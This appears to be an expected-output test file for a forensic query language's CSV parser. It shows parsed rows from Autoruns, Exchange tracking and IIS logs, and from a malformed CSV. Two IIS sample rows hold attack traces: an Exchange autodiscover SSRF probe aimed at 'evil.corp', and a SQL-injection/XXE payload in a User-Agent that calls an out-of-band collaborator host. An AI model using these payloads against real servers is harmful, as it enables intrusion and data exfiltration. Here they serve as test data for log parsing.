SELECT * FROM parse_csv( filename=srcDir + "/artifacts/testdata/files/csv/autoruns.csv")[
 {
  "Time": "7/21/2019 5:23 PM",
  "Entry Location": "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\BootExecute",
  "Entry": "",
  "Enabled": "",
  "Category": "Boot Execute",
  "Profile": "System-wide",
  "Description": "",
  "Company": "",
  "Image Path": "",
  "Version": "",
  "Launch String": ""
 },
 {
  "Time": "12/15/2017 3:07 PM",
  "Entry Location": "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\BootExecute",
  "Entry": "autocheck autochk *",
  "Enabled": "enabled",
  "Category": "Boot Execute",
  "Profile": "System-wide",
  "Description": "Auto Check Utility",
  "Company": "Microsoft Corporation",
  "Image Path": "c:\\windows\\system32\\autochk.exe",
  "Version": "10.0.17134.137",
  "Launch String": "autocheck autochk *"
 },
 {
  "Time": "6/15/2019 6:56 AM",
  "Entry Location": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
  "Entry": "",
  "Enabled": "",
  "Category": "Hijacks",
  "Profile": "System-wide",
  "Description": "",
  "Company": "",
  "Image Path": "",
  "Version": "",
  "Launch String": ""
 }
]LET Path = srcDir + "/artifacts/testdata/files/csv/exchange.log"[]LET Columns = split(string= parse_string_with_regex(string=read_file(filename=Path, length=1000), regex='#Fields. (.+)\n').g1, sep=",")[]SELECT * FROM parse_csv(auto_headers=TRUE, comment="#", columns=Columns, filename=Path)[
 {
  "date-time": "2021-11-03T08:00:32.100Z",
  "client-ip": "1.1.1.1",
  "client-hostname": "SERVER01",
  "server-ip": "",
  "server-hostname": "",
  "source-context": "MDB:abc-123, Mailbox:123-abc, Event:1, MessageClass:IPM.Schedule.Meeting.Resp.Pos, CreationTime:2021-11-03T08:00:32.005Z, ClientType:AirSync, SubmissionAssistant:MailboxTransportSubmissionEmailAssistant",
  "connector-id": "",
  "source": "STOREDRIVER",
  "event-id": "NOTIFYMAPI",
  "internal-message-id": "",
  "message-id": "",
  "network-message-id": "",
  "recipient-address": "",
  "recipient-status": "",
  "total-bytes": "",
  "recipient-count": "",
  "related-recipient-address": "",
  "reference": "",
  "message-subject": "",
  "sender-address": "rec@example.com",
  "return-path": "",
  "message-info": "2021-11-03T08:00:32.005Z;LSRV=BRAUEX1.forest.example.com:TOTAL-SUB=0.095|SA=0.095|MTSS-PEN=0.000",
  "directionality": "",
  "tenant-id": "",
  "original-client-ip": "",
  "original-server-ip": "",
  "custom-data": "S:ItemEntryId=00-AB",
  "transport-traffic-type": "",
  "log-id": "abc-123",
  "schema-versionmessage-id": "15.01.2176.009"
 },
 {
  "date-time": "2021-11-03T08:00:32.147Z",
  "client-ip": "1.1.1.1",
  "client-hostname": "SERVER01.example.com",
  "server-ip": "::1",
  "server-hostname": "SERVER01",
  "source-context": "MDB:abc-123, Mailbox:123-abc, Event:1, MessageClass:IPM.Schedule.Meeting.Resp.Pos, CreationTime:2021-11-03T08:00:32.005Z, ClientType:AirSync, SubmissionAssistant:MailboxTransportSubmissionEmailAssistant, ServerMdbConnectionId:012ABC",
  "connector-id": "",
  "source": "STOREDRIVER",
  "event-id": "RECEIVE",
  "internal-message-id": 4560,
  "message-id": "\u003cemail@example.com\u003e",
  "network-message-id": "ABC-123",
  "recipient-address": "example@email.com",
  "recipient-status": "To",
  "total-bytes": 9222,
  "recipient-count": 1,
  "related-recipient-address": "",
  "reference": "",
  "message-subject": "Example Email Header - Test",
  "sender-address": "rec@example.com",
  "return-path": "rec@example.com",
  "message-info": "04I: ",
  "directionality": "Originating",
  "tenant-id": "",
  "original-client-ip": "",
  "original-server-ip": "",
  "custom-data": "S:MailboxDatabaseGuid=abc-123;S:ItemEntryId=00-AB;S:DeliveryPriority=Normal;S:AccountForest=forest.example.com",
  "transport-traffic-type": "Email",
  "log-id": "abc-123",
  "schema-versionmessage-id": "15.01.2176.009"
 }
]LET IISPath = srcDir + "/artifacts/testdata/files/csv/iis.log"[]LET Headers = regex_replace(source=read_file(filename=IISPath, length=1000), re="date time", replace="date_time")[]LET Columns = split(string=parse_string_with_regex(string=Headers, regex='#Fields. (.+)\n').g1, sep=" ")[]LET MyPipe = pipe(query={ SELECT regex_replace( re='''^(\d{4}-\d{2}-\d{2}) (\d{2}:)''', replace='''${1}T${2}''', source=Line) AS Line FROM parse_lines(filename=IISPath) WHERE NOT Line =~ "^#" }, sep="\n")[]SELECT * FROM parse_csv( columns=Columns, separator=" ", filename="MyPipe", accessor="pipe")[
 {
  "date_time": "2021-10-09T00:00:01",
  "s-ip": "1.1.1.1",
  "cs-method": "GET",
  "cs-uri-stem": "/Microsoft-Server-ActiveSync/default.eas",
  "cs-uri-query": "\u0026CorrelationID=\u003cempty\u003e;\u0026cafeReqId=abc-123;",
  "s-port": 443,
  "cs-username": "mailbox@example.com",
  "c-ip": "::1",
  "cs(User-Agent)": "AMProbe/Local/ClientAccess",
  "cs(Referer)": "-",
  "sc-status": 200,
  "sc-substatus": 0,
  "sc-win32-status": 0,
  "time-taken": 42
 },
 {
  "date_time": "2021-10-09T00:00:01",
  "s-ip": "1.1.1.1",
  "cs-method": "GET",
  "cs-uri-stem": "/ecp/",
  "cs-uri-query": "\u0026CorrelationID=\u003cempty\u003e;\u0026cafeReqId=abc-123;\u0026LogoffReason=NoCookiesGetOrE14AuthPost",
  "s-port": 443,
  "cs-username": "-",
  "c-ip": "::1",
  "cs(User-Agent)": "AMProbe/Local/ClientAccess",
  "cs(Referer)": "-",
  "sc-status": 302,
  "sc-substatus": 0,
  "sc-win32-status": 0,
  "time-taken": 33
 },
 {
  "date_time": "2021-10-09T02:24:04",
  "s-ip": "1.1.1.1",
  "cs-method": "GET",
  "cs-uri-stem": "/autodiscover/autodiscover.json",
  "cs-uri-query": "@evil.corp/ews/exchange.asmx?\u0026Email=autodiscover/autodiscover.json%3F@evil.corp\u0026CorrelationID=\u003cempty\u003e;\u0026cafeReqId=abc-123;",
  "s-port": 443,
  "cs-username": "-",
  "c-ip": "1.1.1.1",
  "cs(User-Agent)": "python-requests/2.26.0",
  "cs(Referer)": "-",
  "sc-status": 200,
  "sc-substatus": 0,
  "sc-win32-status": 0,
  "time-taken": 332
 },
 {
  "date_time": "2021-07-15T08:07:36",
  "s-ip": "10.11.12.13",
  "cs-method": "GET",
  "cs-uri-stem": "/some_url_from_my_website/",
  "cs-uri-query": "-",
  "s-port": 80,
  "cs-username": "-",
  "c-ip": "13.12.11.10",
  "cs(User-Agent)": "(select+extractvalue(xmltype('\u003c?xml+version=\"1.0\"+encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE+root+[+\u003c!ENTITY+%+cveec+SYSTEM+\"http://ta7y99sc16vh9tvo5z7z1crsxj3cr2f530qqef.burpcollab'||'orator.net/\"\u003e%cveec;]\u003e'),'/l')+from+dual)",
  "cs(Referer)": "-",
  "sc-status": 200,
  "sc-substatus": 0,
  "sc-win32-status": 0,
  "time-taken": 15
 }
]LET PathBad = srcDir + "/artifacts/testdata/files/csv/bad.csv"[]SELECT * FROM parse_csv(filename=PathBad)[
 {
  "Foo": "FirstColumn",
  "Bar": "SecondColumnWithLeadingSpace"
 },
 {
  "Foo": "Second with trailing space      ",
  "Bar": "Some other field"
 },
 {
  "Foo": "Line with illegal \" quote will be parsed",
  "Bar": "Field with proper quote"
 },
 {
  "Foo": "field with \" quote",
  "Bar": "other field \" with \" more \" quotes "
 },
 {
  "Foo": 3,
  "Bar": 4
 }
]SELECT * FROM parse_csv(filename=Path, comment="#", columns=["Foo", "Bar"]) LIMIT 1[
 {
  "Foo": "2021-11-03T08:00:32.100Z",
  "Bar": "1.1.1.1",
  "Col2": "SERVER01",
  "Col3": "",
  "Col4": "",
  "Col5": "MDB:abc-123, Mailbox:123-abc, Event:1, MessageClass:IPM.Schedule.Meeting.Resp.Pos, CreationTime:2021-11-03T08:00:32.005Z, ClientType:AirSync, SubmissionAssistant:MailboxTransportSubmissionEmailAssistant",
  "Col6": "",
  "Col7": "STOREDRIVER",
  "Col8": "NOTIFYMAPI",
  "Col9": "",
  "Col10": "",
  "Col11": "",
  "Col12": "",
  "Col13": "",
  "Col14": "",
  "Col15": "",
  "Col16": "",
  "Col17": "",
  "Col18": "",
  "Col19": "rec@example.com",
  "Col20": "",
  "Col21": "2021-11-03T08:00:32.005Z;LSRV=BRAUEX1.forest.example.com:TOTAL-SUB=0.095|SA=0.095|MTSS-PEN=0.000",
  "Col22": "",
  "Col23": "",
  "Col24": "",
  "Col25": "",
  "Col26": "S:ItemEntryId=00-AB",
  "Col27": "",
  "Col28": "abc-123",
  "Col29": "15.01.2176.009"
 }
]